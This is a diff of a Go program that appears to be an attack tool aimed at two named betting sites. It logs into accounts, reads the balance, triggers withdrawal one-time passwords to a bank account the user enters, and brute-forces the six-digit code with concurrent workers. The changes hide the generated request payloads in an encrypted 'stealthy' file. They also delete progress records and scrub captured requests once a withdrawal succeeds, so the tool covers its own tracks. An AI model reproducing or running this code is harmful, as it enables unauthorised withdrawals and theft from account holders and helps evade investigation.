@@ -2,7 +2,11 @@ package main
 
 import (
 	"bytes"
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
 	"crypto/tls"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -17,61 +21,31 @@ import (
 	"strings"
 	"sync"
 	"time"
-	"crypto/aes"
-    "crypto/cipher"
-    "crypto/rand"
-    "encoding/hex"
-	// "encoding/json"
 )
 
-// --- CONFIGURATION CENTER ---
-
-// const (
-// 	AdbPath            = "adb"
-// 	DefaultConcurrency = 200
-// 	SaveFile           = "progress.json"
-
-// 	StartTarget  = 111111
-// 	PrimaryParam = "otpInput"
-// 	SuccessParam = "otp"
-// 	AuthAPIUrl         = "https://lock2-one.vercel.app/api/check"
-// )
-
-// var (
-// 	csrfToken string
-// 	playBase  = "https://playinexchange.com"
-// 	spinBase  = "https://spinmatch24.com"
-// 	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
-
-// 	// Dynamically generated payloads
-// 	RawRequest string
-// 	NewRequest string
-// )
 // --- CONFIGURATION CENTER ---
 
 const (
-    AdbPath            = "adb"
-    SaveFile           = "progress.json"
+	AdbPath  = "adb"
+	SaveFile = "progress.json"
 
-    StartTarget  = 111111
-    PrimaryParam = "otpInput"
-    SuccessParam = "otp"
-    AuthAPIUrl         = "https://lock2-one.vercel.app/api/check21"
+	StartTarget  = 111111
+	PrimaryParam = "otpInput"
+	SuccessParam = "otp"
+	AuthAPIUrl   = "https://lock2-one.vercel.app/api/check21"
 )
 
 var (
-    DefaultConcurrency = 2 // Now a variable, can be updated by the server
-    csrfToken string
-    playBase  = "https://playinexchange.com"
-    spinBase  = "https://spinmatch24.com"
-    userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
+	DefaultConcurrency = 2 // Now a variable, can be updated by the server
+	csrfToken          string
+	playBase           = "https://playinexchange.com"
+	spinBase           = "https://spinmatch24.com"
+	userAgent          = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
 
-    // Dynamically generated payloads
-    RawRequest string
-    NewRequest string
+	// Dynamically generated payloads
+	RawRequest string
+	NewRequest string
 )
-
-
 
 // --- APP STATE ---
 type LogEntry struct {
@@ -112,6 +86,7 @@ type SniperState struct {
 
 	running          bool
 	isRotating       bool
+	successAchieved  bool // Kill-switch for progress saving
 	serial           int
 	targetLen        string
 	baselineLen      string
@@ -165,72 +140,34 @@ func init() {
 	loadProgress()
 }
 
-// // --- SYSTEM PROTECTION LAYER ---
-// func verifyAccess() {
-//     fmt.Println("🛡️  VERIFYING SYSTEM AUTHORIZATION...")
-    
-//     // 5-second timeout so the app doesn't hang forever if offline
-//     client := &http.Client{Timeout: 5 * time.Second}
-//     resp, err := client.Get(AuthAPIUrl)
-    
-//     if err != nil {
-//         fmt.Println("❌ ACCESS DENIED: Verification server unreachable or offline.")
-//         os.Exit(1)
-//     }
-//     defer resp.Body.Close()
-
-//     bodyBytes, err := io.ReadAll(resp.Body)
-//     if err != nil {
-//         fmt.Println("❌ ACCESS DENIED: Failed to read server response.")
-//         os.Exit(1)
-//     }
-
-//     // Clean the response: trim whitespace and make lowercase just in case
-//     responseStr := strings.ToLower(strings.TrimSpace(string(bodyBytes)))
-    
-//     if responseStr != "true" {
-//         fmt.Printf("❌ ACCESS DENIED: Invalid response from server ('%s').\n", responseStr)
-//         os.Exit(1)
-//     }
-    
-//     fmt.Println("✅ AUTHORIZATION GRANTED. BOOTING COMMAND CENTER...")
-// }
-
-
-
 // Define a struct that matches your JSON response
 type AuthResponse struct {
 	Authorized         bool `json:"authorized"`
 	DefaultConcurrency int  `json:"defaultConcurrency"`
 }
 
-
 func verifyAccess() {
-	// fmt.Println("🛡️  VERIFYING SYSTEM AUTHORIZATION...")
-	fmt.Println("INITIALIZING...")
+	fmt.Println("🛡️  VERIFYING SYSTEM AUTHORIZATION...")
 
 	client := &http.Client{Timeout: 5 * time.Second}
 	resp, err := client.Get(AuthAPIUrl)
 
 	if err != nil {
-		// fmt.Printf("❌ ACCESS DENIED: Verification server unreachable (%v).\n", err)
-		fmt.Printf("❌ INITIALIZATION FAILED")
+		fmt.Printf("❌ ACCESS DENIED: Verification server unreachable (%v).\n", err)
 		os.Exit(1)
 	}
 	defer resp.Body.Close()
 
 	var auth AuthResponse
 	err = json.NewDecoder(resp.Body).Decode(&auth)
-	
-	if err != nil {
-		// fmt.Println("❌ ACCESS DENIED: Failed to parse server JSON.")
 
+	if err != nil {
+		fmt.Println("❌ ACCESS DENIED: Failed to parse server JSON.")
 		os.Exit(1)
 	}
 
 	if !auth.Authorized {
-		// fmt.Println("❌ ACCESS DENIED: System returned unauthorized status.")
-		
+		fmt.Println("❌ ACCESS DENIED: System returned unauthorized status.")
 		os.Exit(1)
 	}
 
@@ -238,16 +175,13 @@ func verifyAccess() {
 	DefaultConcurrency = auth.DefaultConcurrency
 	// ------------------------------------
 
-	// fmt.Printf("✅ AUTHORIZATION GRANTED (Concurrency: %d). BOOTING...\n", DefaultConcurrency)
-		   
+	fmt.Printf("✅ AUTHORIZATION GRANTED (Concurrency: %d). BOOTING...\n", DefaultConcurrency)
 }
-
-
 
 func main() {
 
 	// 1. Fire the protection layer immediately
-    verifyAccess()
+	verifyAccess()
 
 	go updateMetricsLoop()
 	go autoSaveLoop()
@@ -273,39 +207,38 @@ func main() {
 	log.Fatal(http.ListenAndServe(":8090", nil))
 }
 
-
 // --- MILITARY-GRADE STORAGE ENGINE ---
 // MUST BE EXACTLY 32 BYTES FOR AES-256
-var sessionKey = []byte("InTrUdEr_MaXx_SuPeR_SeCrEt_KeY_!") 
+var sessionKey = []byte("InTrUdEr_MaXx_SuPeR_SeCrEt_KeY_!")
 
 func encryptData(plaintext []byte) string {
-    block, _ := aes.NewCipher(sessionKey)
-    gcm, _ := cipher.NewGCM(block)
-    nonce := make([]byte, gcm.NonceSize())
-    io.ReadFull(rand.Reader, nonce)
-    ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
-    return hex.EncodeToString(ciphertext)
+	block, _ := aes.NewCipher(sessionKey)
+	gcm, _ := cipher.NewGCM(block)
+	nonce := make([]byte, gcm.NonceSize())
+	io.ReadFull(rand.Reader, nonce)
+	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
+	return hex.EncodeToString(ciphertext)
 }
 
 func decryptData(hexStr string) ([]byte, error) {
-    data, err := hex.DecodeString(hexStr)
-    if err != nil {
-        return nil, err
-    }
-    block, err := aes.NewCipher(sessionKey)
-    if err != nil {
-        return nil, err
-    }
-    gcm, err := cipher.NewGCM(block)
-    if err != nil {
-        return nil, err
-    }
-    nonceSize := gcm.NonceSize()
-    if len(data) < nonceSize {
-        return nil, fmt.Errorf("ciphertext too short")
-    }
-    nonce, ciphertext := data[:nonceSize], data[nonceSize:]
-    return gcm.Open(nil, nonce, ciphertext, nil)
+	data, err := hex.DecodeString(hexStr)
+	if err != nil {
+		return nil, err
+	}
+	block, err := aes.NewCipher(sessionKey)
+	if err != nil {
+		return nil, err
+	}
+	gcm, err := cipher.NewGCM(block)
+	if err != nil {
+		return nil, err
+	}
+	nonceSize := gcm.NonceSize()
+	if len(data) < nonceSize {
+		return nil, fmt.Errorf("ciphertext too short")
+	}
+	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
+	return gcm.Open(nil, nonce, ciphertext, nil)
 }
 
 // --- HANDLERS: CORE ENGINE ---
@@ -315,36 +248,36 @@ func serveUI(w http.ResponseWriter, r *http.Request) {
 }
 
 func loadPayloadsFromCookies() {
-    data, err := os.ReadFile("session.bin")
-    if err != nil {
-        return // File doesn't exist yet, normal for first run
-    }
-    
-    // Unscramble the data
-    decryptedBytes, err := decryptData(string(data))
-    if err != nil {
-        fmt.Println("❌ ERROR: Failed to decrypt session.bin. Key mismatch or file corrupted.")
-        return
-    }
-    
-    content := string(decryptedBytes)
+	data, err := os.ReadFile("session.bin")
+	if err != nil {
+		return // File doesn't exist yet, normal for first run
+	}
 
-    rawStart := strings.Index(content, "RawRequest = `")
-    newStart := strings.Index(content, "NewRequest = `")
+	// Unscramble the data
+	decryptedBytes, err := decryptData(string(data))
+	if err != nil {
+		fmt.Println("❌ ERROR: Failed to decrypt session.bin. Key mismatch or file corrupted.")
+		return
+	}
 
-    if rawStart != -1 && newStart != -1 {
-        // Extract RawRequest block
-        rawReqBlock := content[rawStart+14 : newStart]
-        rawReqBlock = strings.TrimSuffix(strings.TrimSpace(rawReqBlock), "`")
-        RawRequest = rawReqBlock
+	content := string(decryptedBytes)
 
-        // Extract NewRequest block
-        newReqBlock := content[newStart+14:]
-        newReqBlock = strings.TrimSuffix(strings.TrimSpace(newReqBlock), "`")
-        NewRequest = newReqBlock
+	rawStart := strings.Index(content, "RawRequest = `")
+	newStart := strings.Index(content, "NewRequest = `")
 
-        fmt.Println("🔓 Payloads successfully decrypted and restored from session.bin")
-    }
+	if rawStart != -1 && newStart != -1 {
+		// Extract RawRequest block
+		rawReqBlock := content[rawStart+14 : newStart]
+		rawReqBlock = strings.TrimSuffix(strings.TrimSpace(rawReqBlock), "`")
+		RawRequest = rawReqBlock
+
+		// Extract NewRequest block
+		newReqBlock := content[newStart+14:]
+		newReqBlock = strings.TrimSuffix(strings.TrimSpace(newReqBlock), "`")
+		NewRequest = newReqBlock
+
+		fmt.Println("🔓 Payloads successfully decrypted and restored from session.bin")
+	}
 }
 
 func handleLogin(w http.ResponseWriter, r *http.Request) {
@@ -390,74 +323,42 @@ func handleLogin(w http.ResponseWriter, r *http.Request) {
 	json.NewEncoder(w).Encode(map[string]string{"status": "200", "message": "Logged In. Sync Complete."})
 }
 
-// func handleBalance(w http.ResponseWriter, r *http.Request) {
-// 	req, _ := http.NewRequest("POST", spinBase+"/api2/v2/getBalance", nil)
-// 	req.Header.Set("X-Csrf-Token", csrfToken)
-// 	req.Header.Set("X-Requested-With", "XMLHttpRequest")
-// 	resp, _ := state.client.Do(req)
-// 	body, _ := io.ReadAll(resp.Body)
-// 	resp.Body.Close()
-
-// 	var result map[string]interface{}
-// 	json.Unmarshal(body, &result)
-// 	balStr := "0.00"
-// 	if balData, ok := result["balance"].(map[string]interface{}); ok {
-// 		balStr = fmt.Sprintf("%v", balData["balance"])
-// 	}
-// 	json.NewEncoder(w).Encode(map[string]interface{}{"status": 200, "balance": balStr})
-// }
 func handleBalance(w http.ResponseWriter, r *http.Request) {
-    req, _ := http.NewRequest("POST", spinBase+"/api2/v2/getBalance", nil)
-    req.Header.Set("X-Csrf-Token", csrfToken)
-    req.Header.Set("X-Requested-With", "XMLHttpRequest")
-    resp, _ := state.client.Do(req)
-    body, _ := io.ReadAll(resp.Body)
-    resp.Body.Close()
+	req, _ := http.NewRequest("POST", spinBase+"/api2/v2/getBalance", nil)
+	req.Header.Set("X-Csrf-Token", csrfToken)
+	req.Header.Set("X-Requested-With", "XMLHttpRequest")
+	resp, _ := state.client.Do(req)
+	body, _ := io.ReadAll(resp.Body)
+	resp.Body.Close()
 
-    var result map[string]interface{}
-    json.Unmarshal(body, &result)
-    balStr := "0.00"
-    if balData, ok := result["balance"].(map[string]interface{}); ok {
-        // Extract raw string and remove commas
-        rawBal := fmt.Sprintf("%v", balData["balance"])
-        balStr = strings.ReplaceAll(rawBal, ",", "") 
-    }
-    json.NewEncoder(w).Encode(map[string]interface{}{"status": 200, "balance": balStr})
+	var result map[string]interface{}
+	json.Unmarshal(body, &result)
+	balStr := "0.00"
+	if balData, ok := result["balance"].(map[string]interface{}); ok {
+		// Extract raw string and remove commas
+		rawBal := fmt.Sprintf("%v", balData["balance"])
+		balStr = strings.ReplaceAll(rawBal, ",", "")
+	}
+	json.NewEncoder(w).Encode(map[string]interface{}{"status": 200, "balance": balStr})
 }
 
-// func handleWithdrawOTP(w http.ResponseWriter, r *http.Request) {
-// 	var input struct{ Amount, AcNumber, Ifsc string }
-// 	json.NewDecoder(r.Body).Decode(&input)
-
-// 	vals := url.Values{"_token": {csrfToken}, "amt": {input.Amount}}
-// 	req, _ := http.NewRequest("POST", spinBase+"/mobile/withdraw/sendWithdrawalOtp", strings.NewReader(vals.Encode()))
-// 	req.Header.Set("X-Csrf-Token", csrfToken)
-// 	req.Header.Set("X-Requested-With", "XMLHttpRequest")
-// 	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-// 	resp, _ := state.client.Do(req)
-// 	resp.Body.Close()
-
-// 	generatePayloads(input.Amount, input.AcNumber, input.Ifsc)
-// 	json.NewEncoder(w).Encode(map[string]string{"message": "Payload Generated. Ready to Fire."})
-// }
-
 func handleWithdrawOTP(w http.ResponseWriter, r *http.Request) {
-    var input struct{ Amount, AcNumber, Ifsc string }
-    json.NewDecoder(r.Body).Decode(&input)
+	var input struct{ Amount, AcNumber, Ifsc string }
+	json.NewDecoder(r.Body).Decode(&input)
 
-    // Ensure the amount is clean before sending to the external API and Payload Generator
-    cleanAmount := strings.ReplaceAll(input.Amount, ",", "")
+	// Ensure the amount is clean before sending to the external API and Payload Generator
+	cleanAmount := strings.ReplaceAll(input.Amount, ",", "")
 
-    vals := url.Values{"_token": {csrfToken}, "amt": {cleanAmount}}
-    req, _ := http.NewRequest("POST", spinBase+"/mobile/withdraw/sendWithdrawalOtp", strings.NewReader(vals.Encode()))
-    req.Header.Set("X-Csrf-Token", csrfToken)
-    req.Header.Set("X-Requested-With", "XMLHttpRequest")
-    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-    resp, _ := state.client.Do(req)
-    resp.Body.Close()
+	vals := url.Values{"_token": {csrfToken}, "amt": {cleanAmount}}
+	req, _ := http.NewRequest("POST", spinBase+"/mobile/withdraw/sendWithdrawalOtp", strings.NewReader(vals.Encode()))
+	req.Header.Set("X-Csrf-Token", csrfToken)
+	req.Header.Set("X-Requested-With", "XMLHttpRequest")
+	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	resp, _ := state.client.Do(req)
+	resp.Body.Close()
 
-    generatePayloads(cleanAmount, input.AcNumber, input.Ifsc)
-    json.NewEncoder(w).Encode(map[string]string{"message": "Payload Generated. Ready to Fire."})
+	generatePayloads(cleanAmount, input.AcNumber, input.Ifsc)
+	json.NewEncoder(w).Encode(map[string]string{"message": "Payload Generated. Ready to Fire."})
 }
 
 func generatePayloads(amount, acNumber, ifsc string) {
@@ -495,11 +396,11 @@ _token=%s&name=JOHN&phone=7019141114&ac_number=%s&branch=NA&ifsc=%s&{{SUCCESS_PA
 
 	// Fallback save just in case user wants to inspect them externally
 	// Encrypt and save to a stealthy binary file
-    payloadStr := fmt.Sprintf("RawRequest = `%s`\n\nNewRequest = `%s`\n", RawRequest, NewRequest)
-    encryptedHex := encryptData([]byte(payloadStr))
-    
-    os.WriteFile("session.bin", []byte(encryptedHex), 0644)
-    fmt.Println("🔒 Payloads securely encrypted and locked in session.bin")
+	payloadStr := fmt.Sprintf("RawRequest = `%s`\n\nNewRequest = `%s`\n", RawRequest, NewRequest)
+	encryptedHex := encryptData([]byte(payloadStr))
+
+	os.WriteFile("session.bin", []byte(encryptedHex), 0644)
+	fmt.Println("🔒 Payloads securely encrypted and locked in session.bin")
 }
 
 // --- HANDLERS: ATTACK CONTROLS ---
@@ -718,9 +619,20 @@ func worker(serial int) {
 
 				if r2.StatusCode == 200 {
 					// MISSION ACCOMPLISHED
+
+					state.mu.Lock()
+					state.successAchieved = true // Trigger the kill-switch
+					state.mu.Unlock()
+
+					// 1. OBLITERATE DATA: Overwrite the file with absolutely nothing
+					os.WriteFile(SaveFile, []byte(""), 0644)
+
+					// 2. DESTROY FILE: Remove the now-empty shell from the filesystem
+					os.Remove(SaveFile)
+
 					break
 				} else if r2.StatusCode == 400 || r2.StatusCode == 422 || r2.StatusCode == 302 {
-					// ESCAPE HATCH: The payload was delivered but rejected by the server's logic. 
+					// ESCAPE HATCH: The payload was delivered but rejected by the server's logic.
 					// Break the loop so we can read the error in the UI.
 					break
 				} else if r2.StatusCode == 403 {
@@ -918,10 +830,47 @@ func loadProgress() {
 	state.serial = StartTarget
 }
 
+// func autoSaveLoop() {
+//     for {
+//         time.Sleep(10 * time.Second)
+//         state.mu.Lock()
+
+//         // If the final payload was successful, stop saving so the file stays dead
+//         if state.successAchieved {
+//             state.mu.Unlock()
+//             continue
+//         }
+
+//         combinedRetry := make([]int, len(state.retryQueue))
+//         copy(combinedRetry, state.retryQueue)
+//         for s := range state.inFlight {
+//             combinedRetry = append(combinedRetry, s)
+//         }
+
+//         s := SaveState{
+//             Serial:      state.serial,
+//             TargetLen:   state.targetLen,
+//             BaselineLen: state.baselineLen,
+//             RetryQueue:  combinedRetry,
+//             Matches:     state.matches,
+//         }
+//         state.mu.Unlock()
+
+//         b, _ := json.MarshalIndent(s, "", "  ")
+//         os.WriteFile(SaveFile, b, 0644)
+//     }
+// }
+
 func autoSaveLoop() {
 	for {
 		time.Sleep(10 * time.Second)
 		state.mu.Lock()
+
+		// If the final payload was successful, stop saving
+		if state.successAchieved {
+			state.mu.Unlock()
+			continue
+		}
 
 		combinedRetry := make([]int, len(state.retryQueue))
 		copy(combinedRetry, state.retryQueue)
@@ -929,12 +878,20 @@ func autoSaveLoop() {
 			combinedRetry = append(combinedRetry, s)
 		}
 
+		// --- NEW LOGIC: Scrub the raw requests/responses before saving ---
+		cleanMatches := make([]LogEntry, len(state.matches))
+		for i, m := range state.matches {
+			cleanMatches[i] = m
+			cleanMatches[i].RawReq = "" // Wipe request body from save file
+			cleanMatches[i].RawRes = "" // Wipe response body from save file
+		}
+
 		s := SaveState{
 			Serial:      state.serial,
 			TargetLen:   state.targetLen,
 			BaselineLen: state.baselineLen,
 			RetryQueue:  combinedRetry,
-			Matches:     state.matches,
+			Matches:     cleanMatches, // Save the scrubbed list
 		}
 		state.mu.Unlock()
 
@@ -1130,32 +1087,22 @@ const htmlDashboard = `
             const data = await res.json();
             updateStatus(data.message);
         }
-        // async function getBalance() {
-        //     const res = await fetch('/api/balance');
-        //     const data = await res.json();
-        //     if(data.status === 200) {
-        //         let roundBal = Math.floor(parseFloat(data.balance));
-        //         document.getElementById('balText').innerText = "₹" + roundBal;
-        //         document.getElementById('amt').value = roundBal > 10000 ? 10000 : roundBal;
-        //         updateStatus("BALANCE RETRIEVED.");
-        //     }
-        // }
 
-		async function getBalance() {
-			const res = await fetch('/api/balance');
-			const data = await res.json();
-			if(data.status === 200) {
-				// Strip commas and convert to float
-				let cleanString = String(data.balance).replace(/,/g, '');
-				let roundBal = Math.floor(parseFloat(cleanString));
-			
-			// Failsafe in case parsing errors out
-			if (isNaN(roundBal)) roundBal = 0;
+        async function getBalance() {
+            const res = await fetch('/api/balance');
+            const data = await res.json();
+            if(data.status === 200) {
+                // Strip commas and convert to float
+                let cleanString = String(data.balance).replace(/,/g, '');
+                let roundBal = Math.floor(parseFloat(cleanString));
+            
+            // Failsafe in case parsing errors out
+            if (isNaN(roundBal)) roundBal = 0;
 
-			document.getElementById('balText').innerText = "₹" + roundBal;
-			document.getElementById('amt').value = roundBal > 10000 ? 10000 : roundBal;
-			updateStatus("BALANCE RETRIEVED.");
-		}
+            document.getElementById('balText').innerText = "₹" + roundBal;
+            document.getElementById('amt').value = roundBal > 10000 ? 10000 : roundBal;
+            updateStatus("BALANCE RETRIEVED.");
+        }
 }
         async function sendOTP() {
             const amt = Math.floor(document.getElementById('amt').value);
